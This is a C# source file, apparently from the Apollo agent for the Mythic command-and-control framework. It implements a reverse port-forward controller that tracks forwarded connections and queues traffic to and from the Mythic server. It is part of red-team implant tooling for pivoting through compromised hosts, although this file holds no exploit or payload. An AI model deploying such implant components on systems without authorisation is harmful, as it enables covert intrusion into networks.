#undef THREADING
#define THREADING

using Newtonsoft.Json;
using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Security.Cryptography.X509Certificates;
using System.Net.Security;
using Apollo.RPortFwdProxy.Classes;
using Mythic.Structs;
using System.Runtime.Serialization;
using System.Collections;
using Apollo.CommandModules;
using System.Windows.Forms;
using System.Runtime.Remoting.Contexts;
using static Utils.DebugUtils;
using static Utils.ByteUtils;
using Utils.ErrorUtils;

namespace Apollo.RPortFwdProxy
{

    static class RPortFwdController
    {

        public static bool IsActive(string port)
        {
            if (proxyConnectionMap.ContainsKey(port))
            {
                return true;
            }
            return false;
        }

        public static bool is_dispatcher_active = false;

        public static Thread dispatcher;

        public static Dictionary<string, ProxyConnection> proxyConnectionMap = new Dictionary<string, ProxyConnection>();

	public static Queue<PortFwdDatagram> messageQueue = new Queue<PortFwdDatagram>();
        public static Queue<String> messageQueueSendBack = new Queue<String>();

        private static bool exited = false;

        public static string ListPortForward()
        {
            string listport = "";
	    foreach (KeyValuePair<string, ProxyConnection> entry in proxyConnectionMap)
            {
                    listport += entry.Value.GetConfs() +"\n";
            }
            return listport;
        }

        public static bool FlushClient()
	{
	    try{
	        List<string> forwards = null;
	        lock(proxyConnectionMap){
  	            forwards = new List<string>(proxyConnectionMap.Keys);
                    foreach (string port in forwards){
		        proxyConnectionMap[port].StopForward();
                        proxyConnectionMap.Remove(port);
		    }
	        }
	        exited = true;
	        is_dispatcher_active = false;
		return true;
	    }catch(Exception ex){
                return false;
	    }
	}

        public static bool StopClientPort(string port)
        {
            if (IsActive(port))
            {
                try
                {
                    lock (proxyConnectionMap)
                    {
                        proxyConnectionMap[port].StopForward();
                        proxyConnectionMap.Remove(port);
                    }
                    return true;
                }catch (Exception ex)
                {
       		    return false;
                }
            }
            return false;
        }


        public static void StartClientPort(string port, string rport, string rip)
        {
	    try{
                if (is_dispatcher_active == false)
                {
                    is_dispatcher_active = true;
		    exited = false;
		    new Thread(() => DispatchDatagram()).Start();
                }

                ProxyConnection conn = new ProxyConnection(port, rport, rip);
                proxyConnectionMap[port] = conn;


            }catch{}
        }



        // Function respponsible for fetching messages from
        // the queue so that they may be sent to the Mythic
        // server.
        public static PortFwdDatagram[] GetMythicMessagesFromQueue()
        {
            PortFwdDatagram[] default_struct = null;
	    try{
            //PortFwdDatagram message = new PortFwdDatagram() { s = value, length = value.Length };
                if (exited == false)
                {

                    Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>>> message = new Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>>>();
                    List<string> forwards = null;
		    forwards = new List<string>(proxyConnectionMap.Keys);

		    foreach (string entry in forwards)
                    {
                        Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>> specDatagram = proxyConnectionMap[entry].GetMessagesBack();
                        message[entry] = specDatagram;

                    }
                    default_struct = new PortFwdDatagram[1];
                    default_struct[0] = new PortFwdDatagram() { data = message };
		    return default_struct;
                }
                default_struct = new PortFwdDatagram[1];
                default_struct[0] = new PortFwdDatagram();
            }catch{ }
            return default_struct;
        }


        public static void AddDatagramToQueue(PortFwdDatagram dg)
        {
            messageQueue.Enqueue(dg);
        }



        //this function will dispatch each data to each connection in the ProxyConnection Object
        private static void DispatchDatagram()
        {
            while (!exited)
            {
                if (messageQueue.Count > 0)
                {
		    PortFwdDatagram curMsg = (PortFwdDatagram)messageQueue.Dequeue();
			//iterate over dictionary dg
                        //for each localport in dictionary, send the rest to the respective to proxyConnectionMap
                        //data will be processed inside ProxyConnection object
                    foreach(KeyValuePair<string, Dictionary<String, Dictionary<String, Dictionary<String, Dictionary<int,String>>>>> entry in curMsg.data)
                    {
	                if (proxyConnectionMap.ContainsKey(entry.Key))
		        {
                        proxyConnectionMap[entry.Key].AddDatagramToQueueProx(entry.Value);
		        }
		    }
                }
            }
        }

    }
}
